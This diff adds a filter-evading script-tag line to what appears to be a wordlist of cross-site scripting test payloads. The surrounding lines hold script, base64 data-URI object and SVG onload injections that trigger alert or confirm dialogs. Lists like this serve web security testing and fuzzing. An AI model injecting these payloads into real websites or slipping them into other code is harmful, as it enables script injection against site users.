@@ -1,3 +1,4 @@
+'"--!><Script /k/>confirm(1)</Script /k/>#
 '"><script>alret()</script>
 <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4="></object>
 test<svg/onload=confirm(/testing/)>
